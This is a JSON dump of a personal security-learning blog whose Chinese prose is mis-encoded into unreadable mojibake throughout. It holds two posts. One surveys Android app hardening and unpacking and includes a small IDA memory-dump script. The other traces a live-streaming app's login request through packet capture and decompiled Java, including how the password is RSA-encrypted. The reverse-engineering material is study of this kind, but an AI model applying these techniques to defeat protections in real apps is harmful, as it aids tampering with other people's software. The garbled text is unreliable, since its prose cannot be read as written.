{"meta":{"title":"Bin FantasyğŸ¤¯","subtitle":"You may found nothing here.","description":"","author":"Ash3n On3","url":"http://example.com","root":"/"},"pages":[{"title":"","date":"2021-03-26T11:38:47.562Z","updated":"2021-03-26T11:38:47.562Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":"åœ°çƒOLæ¸¸æˆç”Ÿæ¶¯ 2021 ç»§ç»­å­¦Androidï¼Œå¸Œæœ›æ‰¾åˆ°å®ä¹ ã€‚ 2020 ä¸å…¨çƒç©å®¶ä¸€èµ·æ‰“é«˜éš¾åº¦å‰¯æœ¬ğŸ˜·ï¼Œååˆ†å£®çƒˆã€‚ç»§ç»­å­¦pwnï¼Œå¼€å§‹é’»heapã€‚å¼€å§‹å­¦å®‰å“é€†å‘ï¼Œè½¬èŒç§»åŠ¨å®‰å…¨ã€‚ 2019 å­¦ä¹ pwnå’Œre ï¼Œå…¥é—¨äºŒè¿›åˆ¶ã€‚å»ºç«‹åšå®¢ä½†å•¥ä¹Ÿæ²¡å†™ï¼Œè€åˆ’æ°´æ€ªã€‚ 2018 é€šå…³æ–°æ‰‹æ•™ç¨‹ã€‚åˆ·ojå…¥é—¨è®¡ç®—æœºã€‚ Before 2000 â€‹ æ³¨å†Œåœ°çƒOLï¼Œè´¦å·ï¼š@$!F@1#!$ã€‚"},{"title":"Tags","date":"2021-03-23T11:22:39.430Z","updated":"2020-10-03T09:03:26.452Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-10-03T09:03:26.452Z","updated":"2020-10-03T09:03:26.452Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"","date":"2021-03-26T11:44:14.901Z","updated":"2021-03-26T11:44:14.901Z","comments":true,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"åœ°çƒOLé˜Ÿå‹ä»¬","text":"åœ°çƒOLé˜Ÿå‹ä»¬"}],"posts":[{"title":"ApkåŠ å›º","slug":"APPåŠ å›ºä¸åŠ å£³","date":"2021-04-09T09:00:27.000Z","updated":"2021-04-10T09:13:04.012Z","comments":true,"path":"2021/04/09/APPåŠ å›ºä¸åŠ å£³/","link":"","permalink":"http://example.com/2021/04/09/APP%E5%8A%A0%E5%9B%BA%E4%B8%8E%E5%8A%A0%E5%A3%B3/","excerpt":"","text":"åŠ å›ºåŸç†â€‹ APKä¿æŠ¤æªæ–½æŒ‡çš„æ˜¯ä½¿é€†å‘å·¥ä½œè€…è·å–æºä»£ç åä¸ä¾¿åˆ†ææˆ–æ˜¯è·å–apkåä¸ä¾¿è°ƒè¯•ï¼Œè€ŒAPKçš„åŠ å›ºåˆ™æ˜¯é¿å…å¯¹æ–¹ç›´æ¥è·å–åˆ°ç¨‹åºçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ â€‹ å…¶åŸç†æ˜¯åœ¨Androidé¡¹ç›®å°†è¦æ‰“åŒ…å‘å¸ƒæ—¶ï¼Œå†å°†åŠ è§£å¯†ç¨‹åº(å£³ç¨‹åº)å°è£…å…¥dexæ–‡ä»¶ä¸­ï¼Œåœ¨ç¨‹åºè¿è¡Œä¹‹å‰åŸdexæ–‡ä»¶ç”±è§£å¯†ç¨‹åºè§£å‡ºåå†æ­£å¸¸æ‰§è¡Œã€‚è€ŒCrackeræ‹¿åˆ°apkåå¦‚æœä¸åšè„±å£³å¤„ç†ï¼Œåˆ™æ— æ³•ç›´æ¥è·å¾—dexæˆ–è€…soåŸæ–‡ä»¶ï¼Œä¹Ÿå°±ä¸èƒ½ç›´æ¥åˆ†ææºç ã€‚ åŠ å›ºåçš„Dexæ–‡ä»¶åŠ è½½æ–¹å¼è½åœ°å¼åŠ è½½â€‹ è®¾å¤‡å¯åŠ¨APPå‰å…ˆæ‰§è¡Œè§£å£³ç¨‹åºï¼Œå°†åŠ å¯†åçš„dexæ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­è¿›è¡Œè§£å¯†ï¼Œè§£å¯†ä¹‹åçš„å®Œæ•´Dexæ–‡ä»¶ä¼šä¸´æ—¶ä¿å­˜åœ¨ç³»ç»ŸæŸä¸€ä¸ªç›®å½•ä¸‹ï¼Œå†é€šè¿‡DexClassLoadå»åŠ è½½è§£å¯†åçš„dexæ–‡ä»¶ï¼Œè¿è¡Œç¨‹åºã€‚ â€‹ å¯¹äºè¿™ç§åŠ è½½æ–¹å¼ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶æ‰¾åˆ°å®Œæ•´dexå¹¶å¤åˆ¶å‡ºæ¥è¿›è¡Œåˆ†æã€‚ ä¸è½åœ°å¼åŠ è½½ï¼ˆåŠ¨æ€åŠ è½½ï¼‰â€‹ è®¾å¤‡å¯åŠ¨APPå‰å…ˆæ‰§è¡Œè§£å£³ç¨‹åºï¼Œè´Ÿè´£åŠ è½½åŠ å¯†åçš„dexæ–‡ä»¶åˆ°å†…å­˜ä¸­è¿›è¡Œè§£å¯†ï¼Œè§£å¯†ä¹‹åçš„dexæ–‡ä»¶å­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œé€šè¿‡è‡ªå®šä¹‰ClassLoadåŠ è½½å†…å­˜ä¸­çš„dexæ–‡ä»¶æ•°æ®ã€‚ â€‹ å¯¹äºè¿™ç§åŠ è½½æ–¹å¼ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œæ—¶åœ¨å†…å­˜ä¸­æ‰¾åˆ°dexæ–‡ä»¶å¤´åï¼Œdumpå‡ºdexæ–‡ä»¶ã€‚æŸäº›æ—¶å€™dexæ–‡ä»¶åœ¨å†…å­˜ä¸­å¯èƒ½å¹¶éè¿ç»­å­˜æ”¾ï¼Œå› æ­¤å¯èƒ½éœ€è¦æ ¹æ®åç§»æ‹¼æ¥å„ä¸ªç‰‡æ®µå½¢æˆå®Œæ•´dexã€‚ åŠ å£³æŠ€æœ¯å†å² å¸¸ç”¨è„±å£³æœº Dexå…¶ä»–ä¿æŠ¤ å­—æ®µéšè—â€‹ ä½¿ç”¨010Editorå·¥å…·æ‰“å¼€ä¸€ä¸ªdexæ–‡ä»¶ï¼Œå†æ‰“å¼€dex.bt(è‡ªåŠ¨åˆ†æè„šæœ¬)æŒ‰ä¸‹F5æ‰§è¡Œï¼Œé€‰æ‹©éœ€è¦åˆ†æçš„dexæ–‡ä»¶åï¼Œå‘ç°dexæ–‡ä»¶çª—å£ä¸‹å¤šå‡ºäº†åˆ†æçª—å£ã€‚ â€‹ å…¶ä¸­struct string_id_list_dex_type_idså­˜æ”¾ä¸€ä¸ªç»“æ„ä½“æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„ä½“è®°å½•dexä¸­å„ä¸ªç±»çš„ä¿¡æ¯ã€‚ â€‹ å…¶ä¸­uint class_data_offè®°å½•çš„æ˜¯è¯¥ç±»åœ¨dexæ–‡ä»¶ä¸­çš„åç§»é‡ã€‚ â€‹ å°†å…¶å€¼æ”¹ä¸º0ï¼Œå¯ä»¥éšè—ç±»çš„æ–¹æ³•ï¼Œåç¼–è¯‘æ˜¯çœ‹åˆ°çš„æ­¤ç±»å°±æ˜¯ç©ºçš„ç±»ã€‚ æŒ‡ä»¤é›†éšè—â€‹ ç”¨ä¸Šè¿°æ–¹å¼æ‰¾åˆ°ç»“æ„ä½“æ•°ç»„class def item class_ defï¼Œæ‰¾åˆ°Mainactivityçš„ç»“æ„ä½“ï¼ŒæŒ‰ç…§å¦‚ä¸‹è·¯å¾„æ‰¾åˆ°onCreatæ–¹æ³•çš„æŒ‡ä»¤é›†ã€‚ å†å°†insnsæŒ‡ä»¤é›†æ•°ç»„ç½®ç©ºã€‚ ç”¨jadxæ‰“å¼€åˆ™æ— æ³•çœ‹åˆ°onCreatå‡½æ•°çš„å‡½æ•°ä½“ã€‚ Soå±‚åŠ å›ºâ€‹ ç”±äºsoæ–‡ä»¶çš„å®‰å…¨æ€§æ¯”dexé«˜ï¼Œå› æ­¤å¼€å‘è€…æ›´å€¾å‘äºå°†æ¯”è¾ƒé‡è¦çš„ç®—æ³•å’Œåè®®å†™å…¥soå±‚ï¼Œå³å¯å¢åŠ apké€†å‘éš¾åº¦ã€‚ åŠ å£³è‡ªè§£â€‹ æ—©æœŸçš„çˆ±åŠ å¯†å¯¹soå±‚çš„åŠ å›ºå°±æ˜¯å°†åŸæœ‰çš„soå±‚é€šè¿‡ç±»UPXçš„æ–¹å¼åŠ å£³ä¹‹åå†å†™å…¥è‡ªå·±çš„libexec.soä¸­ã€‚åœ¨éœ€è¦è°ƒç”¨appåŸæœ‰çš„soæ—¶å€™å…ˆè¿›è¡Œè§£å¯†ï¼Œå†ä½¿ç”¨libexec.soä¸­è‡ªå®šä¹‰çš„linkeråŠ è½½åˆ°å†…å­˜ä¸­ã€‚å› æ­¤é™æ€åˆ†ææ—¶åªèƒ½çœ‹åˆ°è¢«åŠ å¯†è¿‡çš„soã€‚ â€‹ è¿™ç§ä¿æŠ¤ä¸€èˆ¬åªéœ€è¦åœ¨è¿è¡Œæ—¶dumå‡ºå†…å­˜ä¸­çš„soæ–‡ä»¶å³å¯ï¼Œä½†æ˜¯soæ–‡ä»¶å¯èƒ½å¹¶ä¸è¿ç»­ï¼Œéœ€è¦ä¿®æ”¹elfæ–‡ä»¶çš„ä¸€äº›åç§»ã€‚ å­—ç¬¦ä¸²æ··æ·†â€‹ æ—©æœŸçˆ±åŠ å¯†ä¹Ÿç”¨è¿‡ç±»ä¼¼ollvmçš„æ··æ·†æŠ€æœ¯ã€‚å°†éƒ¨åˆ†å­—ç¬¦ä¸²åŠ å¯†åå‚¨å­˜åœ¨soå±‚ï¼Œè¿è¡Œæ—¶è¿›è¡Œè§£å¯†ã€‚ â€‹ è¯¥æ··æ·†æŠ€æœ¯çš„è§£æ³•ï¼š â€‹ 1.æ‰¾åˆ°è¢«åŠ å¯†çš„soæ–‡ä»¶ï¼Œä¸¢è¿›010 Editorä¸­æ‰¾åˆ°è¢«åŠ å¯†çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚ â€‹ 2.ç”¨IDAåŠ¨æ€è°ƒè¯•ï¼Œåœ¨JNI_onloadã€initã€init_arrayå‡½æ•°ä¸‹æ–­ï¼Œæœç´¢æ­¤æ—¶æœ‰æ— å¼•è¿›ä¸Šè¿°soæ¨¡å—ã€‚ â€‹ 3.æ‰¾åˆ°soæ¨¡å—åå†æ ¹æ®åç§»æ‰¾åˆ°è¢«åŠ å¯†çš„å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œç”¨è„šæœ¬dumpå‡ºã€‚ â€‹ 4.å°†dumpå‡ºçš„æ–‡ä»¶è¦†å†™åˆ°soæ–‡ä»¶è¢«åŠ å¯†çš„éƒ¨åˆ†ã€‚ â€‹ è´´ä¸€ä¸ªdumpè„šæœ¬ï¼š 123456789static main(void)&#123; auto fp,dexAdderss,end,size; start &#x3D; 0x0417D000; end &#x3D; 0x0417F000; fp &#x3D; fopen(&quot;D:\\\\libnet_ cry.so&quot;,&quot;wb&quot;); for( ; start &lt; end ; start++) fputc (Byte(start),fp);&#125; ä»£ç æ··æ·†â€‹ åˆ©ç”¨å®å®šä¹‰ï¼Œä¿®æ”¹ç¨‹åºä¸­çš„å„ä¸ªæ ‡è¯†ç¬¦åç§°ï¼Œé™ä½åˆ†ææ—¶çš„å¯è¯»æ€§ã€‚ ä¿®æ”¹æ–‡ä»¶ç»“æ„â€‹ é€šè¿‡ä¿®æ”¹ä¸€äº›headerï¼Œæ¯”å¦‚å°†æŸä¸ªå‡½æ•°çš„çš„åœ°å€åç§»é‡ç½®ä¸º0ï¼Œæ­¤åè‹¥é€šè¿‡IDAç­‰åˆ†æè½¯ä»¶æ‰“å¼€åˆ™æ— æ³•æ­£å¸¸åç¼–è¯‘ã€‚ä¸è¿‡åªè¦é‡æ–°è®¡ç®—å‡ºåç§»å€¼å³å¯ç ´è§£ã€‚","categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"}]},{"title":"Appç™»å½•é€»è¾‘åˆ†æ","slug":"Appç™»å½•é€»è¾‘","date":"2021-03-28T12:49:47.000Z","updated":"2021-04-07T01:13:47.765Z","comments":true,"path":"2021/03/28/Appç™»å½•é€»è¾‘/","link":"","permalink":"http://example.com/2021/03/28/App%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91/","excerpt":"äººäººç›´æ’­appçš„ç™»å½•è¿‡ç¨‹ã€‚","text":"äººäººç›´æ’­appçš„ç™»å½•è¿‡ç¨‹ã€‚ ä¹‹æ‰€ä»¥é€‰æ‹©è¿™appæ˜¯å› ä¸ºæ²¡æœ‰åŠ å£³ï¼Œè€Œä¸”æ··æ·†ä¹‹åçš„ä»£ç è¿˜ç®—æ¯”è¾ƒå¥½çœ‹ï¼Œç›®å‰appç°åœ¨è¿˜åœ¨è¿è¥ä¸­ã€‚äººäººç›´æ’­çš„ç‰ˆæœ¬æ˜¯v9.10.0ï¼Œè¿™ä¹Ÿæ˜¯åšæ–‡æ’°å†™æ—¶è¯¥appçš„æœ€æ–°ç‰ˆæœ¬ã€‚ ç™»å½•è¿‡ç¨‹æŠ“åŒ…è®¾å¤‡å®‰è£…å¥½appä¹‹åæ‰“å¼€ç™»å½•ç•Œé¢ï¼Œéšæ„è¾“å…¥è´¦å·å¯†ç å°è¯•ç™»å½•ã€‚ è·å¾—æç¤ºâ€è´¦å·æˆ–å¯†ç è¾“å…¥æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥â€ã€‚è¿™æ—¶å€™å¯ä»¥å°†apkä¸¢åˆ°Android Killeråˆ†æï¼Œåœ¨strings.xmlä¸­æœç´¢ä¸Šè¿°Toastæ–‡æœ¬ã€‚ä¸è¿‡æœ¬æ–‡ä»‹ç»æŠ“åŒ…åˆ†æçš„æ–¹æ³•ï¼š åœ¨PCç«¯å®‰è£…Fiddlerï¼Œè®¾ç½®å¥½ç«¯å£å·ä¹‹åå¯¼å‡ºè¯ä¹¦ã€‚ ç¡®ä¿ç”µè„‘å’Œæ‰‹æœºåœ¨åŒä¸€ä¸ªäº’è”ç½‘ä¸‹ä¹‹åï¼Œåœ¨æ‰‹æœºä¸­è¿›å…¥è®¾ç½®ï¼Œå¯¹wifiè®¾ç½®ä»£ç†ï¼Œä¸»æœºå·å‚è§PCçš„ipåœ°å€ã€‚å®Œæˆè®¾ç½®åå®‰è£…ä¸Šè¿°è¯ä¹¦ã€‚ æ‰“å¼€Fiddlerå‘ç°æŠ“åˆ°äº†ä¸å°‘http/httpsçš„åŒ… æ­¤æ—¶æ‰“å¼€å®¢æˆ·ç«¯ï¼Œè¾“å…¥è´¦å·å¯†ç ï¼Œç‚¹å‡»ç™»å½•ï¼Œå†æŸ¥çœ‹Fiddlerï¼Œå‘ç°æœ‰ä¸€ä¸ªç‰¹æ®Šçš„åŒ… æŸ¥çœ‹æŠ¥æ–‡ã€‚ ç”±æ­¤å¯ä»¥åˆ†æï¼Œappåœ¨æ‰‹æœºç«¯å°†è´¦å·å¯†ç åŠ å¯†åæ‹¼æ¥æˆæŠ¥æ–‡å‘é€åˆ°æœåŠ¡å™¨ æ‰¾åˆ°å‡½æ•°è°ƒç”¨æ ˆæ ¹æ®ä¸Šé¢çš„æŠ¥æ–‡ï¼Œåœ¨Android Killerä¸­æœç´¢æ¯”è¾ƒä¸å¸¸è§çš„å­—æ®µï¼Œè¿™é‡Œé€‰çš„æ˜¯tab_sequenceå­—æ®µã€‚ å‘ç°æ•´ä¸ªå·¥ç¨‹ä¸­ä»…æœ‰com.renren.mobile.android.service.ServiceProvider.Ya()å‡½æ•°ä½¿ç”¨äº†è¯¥å­—æ®µã€‚ä¸ºäº†æ–¹ä¾¿æ‰¾åˆ°ç¨‹åºç™»å½•è¿‡ç¨‹ä¸­çš„å‡½æ•°è°ƒç”¨æ ˆï¼Œå¯ä»¥å¯¹æ­¤å‡½æ•°è¿›è¡Œæ–¹æ³•åˆ†æï¼š æ‰“å¼€DDMSï¼Œé€‰ä¸­äººäººç›´æ’­çš„è¿›ç¨‹ï¼Œä¹‹ååœ¨æ‰‹æœºä¸Šæ‰“å¼€ç™»å½•ç•Œé¢å¹¶æå‰è¾“å¥½è´¦å·å¯†ç ã€‚ ç‚¹å‡»æ–¹æ³•åˆ†æï¼Œæ–¹æ³•é™åˆ¶æ•°ä¸º1000(é»˜è®¤)ï¼Œç‚¹å‡»okã€‚ è¿…é€Ÿåœ¨appä¸­ç‚¹å‡»ç™»å½•ï¼Œåœ¨é©¬ä¸Šå›åˆ°DDMSä¸­åœæ­¢æ–¹æ³•åˆ†æã€‚ å¼¹å‡ºæ–¹æ³•åˆ†æçª—å£ã€‚ åœ¨æ–¹æ³•åˆ†æçª—å£ä¸­æ‰¾åˆ°Ya()å‡½æ•°ï¼ŒåŒå‡»åå¯åœ¨parentsä¸­æ‰¾åˆ°ä¸Šå±‚è°ƒç”¨å‡½æ•°ã€‚ ä»¥æ­¤ç±»æ¨ï¼Œå¯ä»¥å¾—åˆ°å¦‚ä¸‹çš„å‡½æ•°è°ƒç”¨æ ˆã€‚ 1234567android.view.view.performClick()ğŸ‘‡è°ƒç”¨com.renren.mobile.android.loginB.register.ui.LoginFromQuickRegisterFragment.onClick()ğŸ‘‡è°ƒç”¨com.renren.mobile.android.loginB.register.ui.LoginFromQuickRegisterFragment.j1()ğŸ‘‡è°ƒç”¨com.renren.mobile.android.service.ServiceProvider.Ya() ç”±äºperformClickå†å¾€ä¸Šæ˜¯ç³»ç»Ÿçº§çš„è¿›ç¨‹ï¼Œäºæ˜¯ä¸å†å‘ä¸Šè¿½æº¯ã€‚ æ–¹æ³•åˆ†æä½¿ç”¨Jadx-guiæ ¹æ®å‡½æ•°è°ƒç”¨æ ˆé€ä¸ªåˆ†ææ–¹æ³•ã€‚ ServiceProvider.Ya()æ­¤å‡½æ•°ç”¨äºæ‹¼æ¥å„ä¸ªå­—æ®µå¹¶å‘å¾€æœåŠ¡ç«¯ã€‚ 12345678910111213141516171819202122232425public static void m8161Ya(String str, String str2, int i, String str3, String str4, Context context, LoginStatusListener loginStatusListener) &#123; JsonObject mb = m7924mb(false); if (str4 != null) &#123; mb.put(&quot;rkey&quot;, str4); &#125; mb.put(&quot;v&quot;, &quot;1.0&quot;); mb.put(&quot;format&quot;, &quot;JSON&quot;); mb.put(&quot;user&quot;, str); mb.put(&quot;password&quot;, str2); mb.put(&quot;uniq_id&quot;, Variables.f12082X); mb.m6432f(&quot;session_key&quot;); mb.put(INetRequest.f12253n, INetRequest.f12254o); mb.put(&quot;tab_sequence&quot;, 1L); JsonObject jsonObject = new JsonObject(); jsonObject.put(&quot;station_id&quot;, Variables.f12072S); mb.put(&quot;ext_info&quot;, jsonObject); mb.put(&quot;sig&quot;, m8499D8(mb)); INetResponse r4 = new 2(loginStatusListener, str, str2, context); HttpRequestWrapper httpRequestWrapper = new HttpRequestWrapper(); httpRequestWrapper.setUrl(ConstantUrls.k + &quot;/client/login&quot;); httpRequestWrapper.setData(mb); httpRequestWrapper.setResponse(r4); httpRequestWrapper.setSecretKey(f11721O); HttpProviderWrapper.getInstance().addRequest(httpRequestWrapper); &#125; å…¶ä¸­çš„userå’Œpasswordå­—æ®µçš„å€¼ç”±è°ƒç”¨å‡½æ•°ä¼ å…¥ã€‚ LoginFromQuickRegisterFragment.j1()å‘ç°å¯†ç é€šè¿‡RSAç±»çš„å‡½æ•°åŠ å¯†ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374/* j1é‡å‘½åä¸ºnew_ser */private void new_ser()&#123; String str; SettingManager.g0().ra(&quot;&quot;); SettingManager.g0().sa(-1); //åœ¨RSAä¸­å¯åŠ¨æ–°çº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹åˆå§‹åŒ–å„ä¸ªå±æ€§ï¼Œè¯¦è§RSA.java RSA.g(); m6206f1(); //è·å–è´¦å·è¾“å…¥æ¡†çš„å­—ç¬¦ä¸² Variables.v = this.f18480x.getText().toString().trim(); //è·å–å¯†ç è¾“å…¥æ¡†çš„å­—ç¬¦ä¸² Variables.w = this.f18479w.getText().toString().trim(); String account = Variables.v; if (account == null || account.length() == 0) &#123; //æç¤ºï¼šè´¦å·ä¸èƒ½ä¸ºç©º Toast.makeText((Context) getActivity(), (CharSequence) RenrenApplication.getContext().getResources().getString(C0667R.string.v5_0_1_guide_register_account_no_null), 1).show(); return; &#125; String pwd = Variables.w; if (pwd == null || pwd.length() == 0) &#123; //æç¤ºï¼šå¯†ç ä¸èƒ½ä¸ºç©º Toast.makeText((Context) getActivity(), (CharSequence) RenrenApplication.getContext().getResources().getString(C0667R.string.v5_0_1_guide_register_password_no_null), 1).show(); &#125; else if (Methods.U0(Variables.v)) &#123; //æç¤ºï¼šè´¦å·ä¸èƒ½æœ‰ä¸­æ–‡å­—ç¬¦ Methods.showToast(getResources().getString(C0667R.string.v5_0_1_guide_register_not_have_china), false); &#125; else if (Methods.U0(Variables.w)) &#123; //æç¤ºï¼šå¯†ç ä¸èƒ½æœ‰ä¸­æ–‡å­—ç¬¦ Methods.showToast(getResources().getString(C0667R.string.v5_0_1_guide_register_pwd_have_china), false); &#125; else &#123; //å¦‚æœä¸Šè¿°æ£€æŸ¥æ— å¼‚å¸¸ï¼Œå°±ç”¨RSAç±»çš„æ–¹æ³•åˆå§‹åŒ–å˜é‡ã€‚ rkey = RSA.get_rkey(); this.n = RSA.get_n(); String tmp_e = RSA.get_e(); this.e = tmp_e; if (rkey != null) &#123; try &#123; //å¯†ç ç”¨RSA.b()å‡½æ•°å¤„ç†è¿‡ Variables.w = RSA.b(Variables.w, this.n, tmp_e); RSA.isDone = 1; &#125; catch (Exception e2) &#123; e2.printStackTrace(); &#125; &#125; else &#123; Variables.w = Md5.toMD5(Variables.w); RSA.isDone = 2; &#125; String str2 = Variables.v; //å¦‚æœè´¦å·å¯†ç é•¿åº¦æ­£ç¡® if (str2 != null &amp;&amp; str2.length() &gt; 0 &amp;&amp; (str = Variables.w) != null &amp;&amp; str.length() &gt; 0) &#123; if (this.f18462G == null) &#123; Dialog dialog = new Dialog(getActivity()); this.f18462G = dialog; dialog.setContentView(C0667R.layout.login_dialog); ((ImageView) this.f18462G.findViewById(2131299173)).startAnimation(AnimationUtils.loadAnimation(getActivity(), C0667R.anim.login_dialog_scale)); &#125; this.f18462G.show(); if (RSA.isDone != 1) &#123; rkey = null; &#125; //è°ƒç”¨Ya()ï¼Œå‘ç°ç¬¬ä¸€ç¬¬äºŒä¸ªå‡½æ•°åˆ†åˆ«ä¸ºè´¦å·å¯†ç  ServiceProvider.Ya(Variables.v, Variables.w, 1, &quot;&quot;, rkey, getActivity(), this.f18471P); &#125; &#125;&#125; LoginFromQuickRegisterFragment.onClick()ä»…è°ƒç”¨ï¼Œæ— é‡è¦é€»è¾‘ã€‚ 123456789101112public void onClick(View view) &#123; //switchåˆ¤æ–­è¢«ç‚¹å‡»çš„Button switch (view.getId()) &#123; ... case 2131301366: //å¦‚æœç”¨æˆ·ç‚¹å‡»ç™»å½•ï¼Œåˆ™è°ƒç”¨new_ser new_ser(); return; ... &#125; &#125; RSA.javaRSAçš„åŠ å¯†å·¥å…·ç±» 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677package com.renren.mobile.utils;import com.xiaomi.mipush.sdk.Constants;import java.io.BufferedReader;import java.io.InputStreamReader;import java.math.BigInteger;import java.net.URL;import java.security.KeyFactory;import java.security.interfaces.RSAPublicKey;import java.security.spec.InvalidKeySpecException;import java.security.spec.RSAPublicKeySpec;import javax.crypto.Cipher;import kotlin.UByte;public final class RSA &#123; public static String rkey; public static String e; public static String n; private static String info_from_url; public static int done; private static String a(byte[] bArr) &#123; StringBuilder sb = new StringBuilder(); for (byte b : bArr) &#123; sb.append(Integer.toString((b &amp; UByte.f22619c) + 256, 16).substring(1)); &#125; return sb.toString(); &#125; //ç”¨æˆ·è¾“å…¥å¯†ç ç”±æ­¤å‡½æ•°åŠ å¯†ï¼Œåä¸¤ä¸ªå‚æ•°æœ¬è´¨ä¸Šæ˜¯æœåŠ¡å™¨ç«¯ä¼ å›çš„nå’Œeçš„å€¼ public static String b(String pwd, String ee, String dd) throws Exception &#123; Cipher instance = Cipher.getInstance(&quot;RSA&quot;); instance.init(1, c(ee, dd)); return a(instance.doFinal(pwd.getBytes())); &#125; private static RSAPublicKey c(String str, String str2) throws Exception &#123; try &#123; return (RSAPublicKey) KeyFactory.getInstance(&quot;RSA&quot;).generatePublic(new RSAPublicKeySpec(new BigInteger(str, 16), new BigInteger(str2, 16))); &#125; catch (InvalidKeySpecException e2) &#123; throw new Exception(e2.getMessage()); &#125; &#125; public static String d() &#123; return e; &#125; public static String e() &#123; return n; &#125; public static String f() &#123; return rkey; &#125; public static void g() &#123; //å¯åŠ¨æ–°çº¿ç¨‹ï¼Œå…¶ä»»åŠ¡æ˜¯è°ƒç”¨init_from_url()ï¼Œæ•…åœ¨new_serä¸­RSA.g()ç›´æ¥å®ç°äº†ç±»å±æ€§çš„åˆå§‹åŒ– new Thread(RunnableC0828a.f7137a).start(); &#125; static void init_from_url() &#123; try &#123; //è¿”å›urlçš„å†…å®¹ String i = i(); info_from_url = i; if (i != null) &#123; //æ ¹æ®info_from_urlå­—ç¬¦ä¸²åˆå§‹åŒ–eã€nã€rkey e = i.split(Constants.COLON_SEPARATOR)[2].split(Constants.ACCEPT_TIME_SEPARATOR_SP)[0].trim(); n = info_from_url.split(Constants.COLON_SEPARATOR)[3].split(Constants.ACCEPT_TIME_SEPARATOR_SP)[0].trim(); rkey = info_from_url.split(Constants.COLON_SEPARATOR)[5].split(&quot;\\\\&#125;&quot;)[0].trim(); //å»æ‰åŒå¼•å· e = e.substring(1, e.length() - 1); n = n.substring(1, n.length() - 1); rkey = rkey.substring(1, rkey.length() - 1); &#125; &#125; catch (Exception e2) &#123; e2.printStackTrace(); &#125; &#125; private static String i() throws Exception &#123; //è®¿é—®å¦‚ä¸‹urlï¼ŒæœåŠ¡å™¨ä¼šè¿”å›ä¸€ä¸²æ‹¼æ¥äº†eã€nã€rkeyçš„å­—ç¬¦ä¸²ï¼Œå³æœåŠ¡å™¨ä¸ºå®¢æˆ·ç«¯åˆ†é…å…¬é’¥ BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(new URL(&quot; http://login.renren.com/ajax/getEncryptKey&quot;).openStream(), &quot;GB2312&quot;)); String readLine = bufferedReader.readLine(); bufferedReader.close(); return readLine; &#125;&#125; å“åº”æŠ¥æ–‡ç”¨æˆ·æ•°æ®å‘å¾€æœåŠ¡å™¨ä¹‹åï¼ŒæœåŠ¡å™¨ä¼šå‘ä¼šä¸€ä¸ªå“åº”æŠ¥æ–‡ã€‚ ç™»å½•å¤±è´¥ï¼š ç™»å½•æˆåŠŸï¼š ç”±äºå“åº”åˆ°å®¢æˆ·ç«¯åˆ¤æ–­è¾“å‡ºçš„è¿‡ç¨‹è®¾è®¡å¤ªå¤šç½‘ç»œç¼–ç¨‹ğŸ¤£ï¼Œæ²¡æœ‰å¤ªå¤šæ¶‰çŒï¼Œæ‰€ä»¥å°±ä¸æ·±ç©¶äº†ï¼Œä»…åˆ†æå®¢æˆ·ç«¯è¾“å…¥åˆ°ä¸Šä¼ æ•°æ®çš„è¿‡ç¨‹ã€‚ æ€»ç»“ ç”¨æˆ·è¾“å…¥è´¦æˆ·å¯†ç åï¼Œæ•°æ®ä¼ å…¥new_serå‡½æ•°ã€‚ åœ¨åˆ¤æ–­è¾“å…¥æ ¼å¼æ— è¯¯åï¼Œæ–°å»ºRSAç±»å¹¶åˆå§‹åŒ–ã€‚ RSAç±»æ–°å»ºçº¿ç¨‹ï¼Œè®¿é—®urlï¼Œè·å–æœåŠ¡å™¨åˆ†é…çš„å¯†é’¥ã€‚ RSAç”¨åˆ†é…çš„å¯†é’¥ä»¥åŠå…¶ä»–å­—æ®µä¿¡æ¯åˆå§‹åŒ–è‡ªèº«å„ä¸ªå±æ€§ã€‚ new_serç±»ä¼ å…¥ç”¨æˆ·è¾“å…¥çš„å¯†ç ä»¥åŠurlä¸­çš„nå’Œeç»™RSAç±»ä¸­çš„b()å‡½æ•°ä½œä¸ºå‚æ•°ã€‚ å¯†ç åŠ å¯†å®Œæˆ new_serå°†è´¦å·å¯†ç ä»¥åŠrkeyä¼ å…¥Yaå‡½æ•°ã€‚ Yaå‡½æ•°è¿›è¡Œæ‹¼æ¥å‘é€ã€‚ æœåŠ¡å™¨åˆ¤æ–­è´¦å·å¯†ç æ˜¯å¦æ­£ç¡®ï¼Œæ ¹æ®ç»“æœè¿”å›ä¸åŒå“åº”ã€‚ æŠ“åŒ…è¡¥å……å¯¹äºæŸäº›APP(ç‰¹åˆ«æ˜¯å¤§å‚)æŒ‰ç…§è€æ–¹æ³•æŠ“åŒ…ï¼Œå‘ç°ç™»å½•çš„æŠ¥æ–‡æ²¡åŠæ³•æŠ“åˆ°ã€‚ åŸå› æ˜¯ä¸ºäº†ä¿æŠ¤æ•°æ®å®‰å…¨ï¼Œå¤§éƒ¨åˆ†appåœ¨ä¼ è¾“æ•æ„Ÿç”¨æˆ·ä¿¡æ¯çš„æ•°æ®åŒ…æ—¶å¹¶ä¸ä¼šæŒ‰ç…§ç³»ç»Ÿä»£ç†è®¾ç½®ä¼ è¾“ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº›æµé‡åŒ…æ 